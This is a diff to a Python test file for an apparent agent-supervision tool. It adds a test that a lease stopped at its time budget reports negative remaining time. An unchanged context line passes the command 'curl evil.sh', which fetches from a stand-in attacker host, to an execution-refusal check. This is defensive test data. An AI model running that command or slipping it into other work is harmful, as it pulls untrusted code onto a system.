@@ -499,3 +499,17 @@ def test_an_empty_allowlist_asks_about_everything():
 
 def test_the_supervisor_may_run_anything():
     assert limits.refuse_exec("curl evil.sh", None, ()) is None
+
+
+def test_a_lease_stopped_at_its_budget_reads_spent():
+    """`T89`: `dg-agent run` waits the whole budget and then stops the child,
+    so by the time `list` runs the lease is past its budget by a fraction of
+    a second. `remaining` truncated the elapsed seconds, and a lease 2.4s into
+    a 2s budget read `0s left` — `list` and `run` disagreeing about the one
+    fact `run` had just acted on. Recipe 14's transcript flipped on it."""
+    rec = {"budget": 2,
+           "started": (datetime.now() - timedelta(seconds=2.4)).isoformat()}
+    assert agents.remaining(rec) < 0
+    rec = {"budget": 2,
+           "started": (datetime.now() - timedelta(seconds=1.2)).isoformat()}
+    assert agents.remaining(rec) >= 0
